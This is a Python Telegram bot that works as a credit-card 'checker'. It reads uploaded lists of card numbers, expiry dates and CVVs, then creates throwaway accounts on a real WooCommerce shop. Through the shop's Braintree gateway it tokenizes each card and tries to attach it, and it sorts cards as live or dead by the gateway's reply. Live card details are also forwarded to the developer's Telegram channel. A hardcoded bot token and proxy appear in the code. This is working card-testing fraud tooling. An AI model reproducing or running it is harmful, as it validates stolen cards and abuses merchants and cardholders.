"""
DIV » @IAMJDVIP 

• TO USE THE FILE U NEED TO CHANGE SOMETHING
• RESPONSE LIVE OR DEAD IN LINE 442
• MESSAGE SEND IN LINE 437
• U CAN Do SOMETHING NICE IF U WANT TO
"""
import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

os.system('clear')

O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know�?
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purpl
R = '\033[5;31m' #Red
logo = pyfiglet.figlet_format('Course  HSON')

import traceback 
import re
import telebot
from telebot.types import Message,InlineKeyboardButton,InlineKeyboardMarkup,Document
from telebot import TeleBot
import requests,time,re,user_agent
import requests
import uuid
import base64
bot = TeleBot(token="6399549826:AAG14DXKoBswRxQBjkqpMq9HTUOHjTuR3sA")
def load_authorized_ids():
    with open('id.txt', 'r') as file:
        return [int(line.strip()) for line in file]

authorized_ids = load_authorized_ids()
allowed_user_id = 5667144845
def is_allowed_user(user_id):
    return user_id == allowed_user_id

def is_authorized(message):
    return message.from_user.id in authorized_ids

@bot.message_handler(func=lambda message: not is_authorized(message))
def unauthorized_message(message):
    bot.reply_to(message, "أنت غير مصرح لك باستخدام هذا البوت. الرجاء التواصل مع المطور @D_X_A .")#رساله الغير مصرح لهم

@bot.message_handler(commands=['add_id'])
def add_id(message):
    user_id = message.from_user.id
    if is_allowed_user(user_id):
        user_to_add = int(message.text.split()[1])
        authorized_ids.append(user_to_add)

        with open('id.txt', 'a') as file:
            file.write(f"{user_to_add}\n")
        bot.reply_to(message, f"تمت إضافة معرف {user_to_add} بنجاح.")
    else:
        bot.reply_to(message, "ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ")

@bot.message_handler(commands=['remove_id'])
def remove_id(message):
    user_id = message.from_user.id
    if is_allowed_user(user_id):
        user_to_remove = int(message.text.split()[1])
        if user_to_remove == 6490101544:  
            bot.reply_to(message, "لا يمكن حذف المطور")
        elif user_to_remove in authorized_ids:
            authorized_ids.remove(user_to_remove)

            with open('id.txt', 'w') as file:
                for auth_id in authorized_ids:
                    file.write(f"{auth_id}\n")
            bot.reply_to(message, f"تمت إزالة معرف {user_to_remove} بنجاح.")
        else:
            bot.reply_to(message, "المعرف غير موجود.")
    else:
        bot.reply_to(message, "ɴᴏᴛ ᴀᴠᴀɪʟᴀʙʟᴇ")

decoded_bytes = base64.b64decode("4bSA4bSN4bSK4bSF")
DIV = decoded_bytes.decode('utf-8')
#REQ TRSHH 



@bot.message_handler(commands=['start', 'help'])
def start_help(m: Message):
    a = InlineKeyboardMarkup(row_width=1)
    a.add(
        InlineKeyboardButton(text='ᴀᴍᴊᴅ', url='https://t.me/D_X_A')
    )
    name = f'<a href="tg://openmessage?user_id={m.chat.id}" target="_blank">{m.chat.first_name}</a>'.upper()
    bot.send_message(chat_id=m.chat.id, text=f'''
🤖 Bot Status: Active ✅

💡{name} TO RUN CHK SEND FILE CC

💳 AFTER CLEAN HIM !!
''', parse_mode='html',reply_to_message_id=m.message_id, reply_markup=a)

def get(query):
    proxies = {'https': '182.16.171.42:43188', 'http': '182.16.171.42:43188'}
    try:
        api = requests.get(f'https://lookup.binlist.net/{query}').json()
    except Exception as e:
        print(e)
        ch = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        cou = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        ra = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        emoji = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        ame = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
        return ch, cou, ra, emoji, ame, type
    try:
        chh = api['scheme']
        ch = chh.upper()
    except:
        ch = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        typ = api['type']
        type = typ.upper()
    except:
        type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        raa = api['brand']
        ra = raa.upper()
    except:
        ra = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        am = api['bank']['name']
        ame = am.upper()
    except:
        ame = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        co = api['country']['name']
        cou = co
    except:
        cou = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    try:
        emoji = api['country']['emoji']
    except:
        emoji = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
    return ch, cou, ra, emoji, ame, type

@bot.message_handler(content_types=['document'])
def startCHECKER(d: Document):
    import requests
    p = d.document.file_id
    user = user_agent.generate_user_agent()
    a = bot.get_file(file_id=p)
    w = bot.download_file(file_path=a.file_path)
    print(d.document.file_name)
    with open(d.document.file_name, 'wb') as file:
        file.write(w)
    file = open(d.document.file_name, 'r').read().splitlines()
    msg = bot.send_message(chat_id=d.chat.id, text='Just a minute  ...', reply_to_message_id=d.id, parse_mode='html')
    dead = 0
    live = 0
    ch = 0
    risk = 0
    ccn = 0
    
    try:
        for e in file:
	        n = e.split('|')[0]
	        mm = e.split('|')[1]
	        yy = e.split('|')[2]
	        cvc = e.split('|')[3]
	        card = e.replace('\n', '')
	        start_time = time.time()
	            
	        user = user_agent.generate_user_agent()
	  
	        r = requests.session()
	 
	        r.follow_redirects = True
	        print(n)
	        r.verify = False
	
	
	  
	        def generate_full_name():
	            first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                      "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                      "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                      "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                      "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                      "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                      "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                      "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                      "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                      "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
	       
	            last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                      "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                      "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                      "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                      "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                      "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                      "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                      "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
	       
	            full_name = random.choice(first_names) + " " + random.choice(last_names)
	            first_name, last_name = full_name.split()
	            return first_name, last_name
	   
	        def generate_address():
	                cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	                states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	                streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	                zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	                city = random.choice(cities)
	                state = states[cities.index(city)]
	                street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	                zip_code = zip_codes[states.index(state)]
	                return city, state, street_address, zip_code
	        first_name, last_name = generate_full_name()
	        city, state, street_address, zip_code = generate_address()
	       
	   
	   
	   
	   
	   
	        def generate_random_account():
	                name = ''.join(random.choices(string.ascii_lowercase, k=20))
	                number = ''.join(random.choices(string.digits, k=4))
	                return f"{name}{number}@gmail.com"
	        acc = (generate_random_account())
	   
	  
	        def username():
	                name = ''.join(random.choices(string.ascii_lowercase, k=20))
	                number = ''.join(random.choices(string.digits, k=20))
	                return f"{name}{number}"
	        username = (username())
	            
	    
	            
	   
	        def num():
	                number = ''.join(random.choices(string.digits, k=7))
	                return f"303{number}"
	        num = (num())
	   
	   
	        def generate_random_code(length=32):
	                letters_and_digits = string.ascii_letters + string.digits
	                return ''.join(random.choice(letters_and_digits) for _ in range(length))
	   
	        corr = generate_random_code()
	   
	        sess = generate_random_code()
	            
	            
	            
	            
	            
	        headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,}
	        print("Ok ...");response = r.get('https://thevacuumfactory.com/my-account/', headers=headers)
	        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	        headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,}
	        data = {
	     'username': username,
	     'email': acc,
	     'password': 'Ah2002Ah!',
	     'woocommerce-register-nonce': register,
	     '_wp_http_referer': '/my-account/',
	     'register': 'Register',}
	        print("Ok ... ")
	        response = r.post('https://thevacuumfactory.com/my-account/', headers=headers, data=data)
	            
	            
	            
	        headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,}
	        response = r.get('https://thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	     
	         
	        address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	        headers = {
		     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		     'cache-control': 'no-cache',
		     'content-type': 'application/x-www-form-urlencoded',
		     'pragma': 'no-cache',
		     'user-agent': user,}
	        data = {
		     'billing_first_name': first_name,
		     'billing_last_name': last_name,
		     'billing_company': '',
		     'billing_country': 'US',
		     'billing_address_1': street_address,
		     'billing_address_2': '',
		     'billing_city': city,
		     'billing_state': state,
		     'billing_postcode': zip_code,
		     'billing_phone': num,
		     'billing_email': acc,
		     'save_address': 'Save address',
		     'woocommerce-edit-address-nonce': address,
		     '_wp_http_referer': '/my-account/edit-address/billing/',
		     'action': 'edit_address',}
		
	        response = r.post('https://thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	         
	        print("address ... ")
	        headers = {
		     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		     'cache-control': 'no-cache',
		     'pragma': 'no-cache',
		     'user-agent': user,}
	        response = r.get('https://thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers) 
	            
	        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	        headers = {
		     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		     'cache-control': 'no-cache',
		     'content-type': 'application/x-www-form-urlencoded',
		     'pragma': 'no-cache',
		     'user-agent': user,}
	        data = {
		      'action': 'wc_braintree_credit_card_get_client_token',
		      'nonce': client,}
	        response = r.post('https://thevacuumfactory.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	        print("long ... ")
	        enc = response.json()['data']
	        dec = base64.b64decode(enc).decode('utf-8')
	        au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	        headers = {
		      'authority': 'payments.braintree-api.com',
		      'accept': '*/*',
		      'authorization': f'Bearer {au}',
		      'braintree-version': '2018-05-10',
		      'cache-control': 'no-cache',
		      'content-type': 'application/json',
		      'pragma': 'no-cache',
		      'user-agent': user}
	        json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '8b3397d6-124f-4dee-91bd-e0be1c5e7b93',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
					}
		  
	        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	        print("graphql ... ")
	        
	        tok = response.json()['data']['tokenizeCreditCard']['token']

	        headers = {
		     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		     'cache-control': 'no-cache',
		     'content-type': 'application/x-www-form-urlencoded',
		     'pragma': 'no-cache',
		     'user-agent': user,}
		  
	        data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
					}
	        response = r.post('https://thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	        print("add ... ")
	
	            
	            #print(response.text)
	        pattern = re.compile(r'<ul class="woocommerce-error" role="alert">\s*<li>(.+?)</li>\s*</ul>', re.DOTALL)
	
	        match = pattern.search(response.text)
	        d_time = time.time() - start_time
	        if match:
	                found_text = match.group()
	                lines = found_text.split('\n')
	                result = lines[2].strip()
	
	        else:
	                print("Response not find")
	                found_text=response.text
	                result="rejected"
	        time.sleep(0)
	        req=response
	        if "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds" in result: 
	              time.sleep(60)
	        if 'Payment method successfully' in req.text or 'Nice!' in req.text or 'exists in the vault.' in found_text or 'avs: Gateway Rejected: avs' in result:
	                live+=1
	                reason = '1000: Approved'
	                print(f'{card} / {reason}')
	                m = get(query=card[:6])
	                bot.send_message(chat_id=d.chat.id, text=f'''
	
	Live Card ✅
	━━━━━━━━━━━━━━━━━━━━
	CC : {card}
	Gateway : Auth B3
	Status : Live ✅
	Response : 1000: Approved
	━━━━━━━ Bin Info ━━━━━━━
	Bin Info : {m[0]} - {m[2]} - {m[5]}
	Bank : {m[4]}
	Country : {m[1]} {m[3]}
	━━━━━━━━━━━━━━━━━━━━
	Checker By - <a href="tg://openmessage?user_id={d.chat.id}" target="_blank">{d.chat.first_name}</a> [Premium]
	                                    ''', parse_mode='html')
	                chan = "@D_X_A"
	                bot.send_message(chat_id=chan, text=f'''
	み Th1Ch ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	⸙ CC » {card}
	⸙ Status » Live ! ✅
	⸙ Result » APPROVED ! ✅
	⸙ GateWay » B3 Charge
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	⸙ Info » {m[0]}  {m[2]}  {m[5]}
	⸙ Bank » {m[4]}
	⸙ Country » {m[1]} {m[3]}
	
	⸙ T/t » {d_time:.2f}       Proxy » LIVE !
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	み Developed By ↝ {DIV}_↯  ''')
	        elif '(C2 : CVV2 DECLINED)' in result:
	                m = get(query=card[:6])
	                print(result)
	                ccn+=1
	                bot.send_message(chat_id=d.chat.id, text=f'''み Th1Ch ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	⸙ CC » {card}
	⸙ Status » CCN ! ☑️
	⸙ Result » 2010 Card Issuer Declined CVV ! ☑️
	⸙ GateWay » B3 Charge
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	⸙ Info » {m[0]}  {m[2]}  {m[5]}
	⸙ Bank » {m[4]}
	⸙ Country » {m[1]} {m[3]}
	
	⸙ T/t » {d_time:.2f}       Proxy » LIVE !
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	み Developed By ↝ {DIV}_↯  ''')
	        elif 'Insufficient Funds' in result:
	                m = get(query=card[:6])
	                live+=1
	                print(result)
	                bot.send_message(chat_id=d.chat.id, text=f'''み Th1Ch ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	⸙ CC » </a>{card}</a>
	⸙ Status » CCV ! ✅
	⸙ Result » APPROVED ! ✅
	⸙ GateWay » B3 Charge
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	⸙ Info » {m[0]}  {m[2]}  {m[5]}
	⸙ Bank » {m[4]}
	⸙ Country » {m[1]} {m[3]}
	
	⸙ T/t » {d_time:.2f}       Proxy » LIVE !
	ᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳᅳ
	み Developed By ↝ {DIV}_↯  ''')
	        else:
	                reason = result
	                r=reason
	                print(r)
	                if 'Gateway Rejected: risk_threshold' in reason:
	                    risk+=1
	                else:
	                    dead+=1
	        limit = len(file)
	        checked = live+dead+risk
	        button = InlineKeyboardMarkup(row_width=1)
	        button.add(
	                    InlineKeyboardButton(text=f'• {card} •', callback_data='card'),
	                     InlineKeyboardButton(text=f'Response : {reason}', callback_data='reason'),
	                    InlineKeyboardButton(text=f'𝗖𝗛𝗔𝗥𝗚𝗘 🔥: {int(ch)}', callback_data='ch'),
	                    InlineKeyboardButton(text=f'LIVE ✅ : {int(live)}', callback_data='live'),
	                    InlineKeyboardButton(text=f'𝗰𝗰𝗻 ✔☑️ : {int(ccn)}', callback_data='ccn'),
	              InlineKeyboardButton(text=f'𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ : {int(dead)}', callback_data='dead'),
	                   InlineKeyboardButton(text=f'RISK ⚠️ : {int(risk)}', callback_data='risk'),
	                                          InlineKeyboardButton(text=f'CHECKED 🗑 : {int(checked)}', callback_data='checked'),
	
	                    InlineKeyboardButton(text=f'Limit 💳: {int(limit)}', callback_data='limit')
	            )
	        bot.edit_message_text(chat_id=d.chat.id, message_id=msg.message_id ,text=f'Checking in progress ~𓆩 HSON 𓆪- @D_X_A .',
	                                 parse_mode='html', reply_markup=button)
    except Exception as e:
        traceback.print_exc()
        pass
bot.infinity_polling()
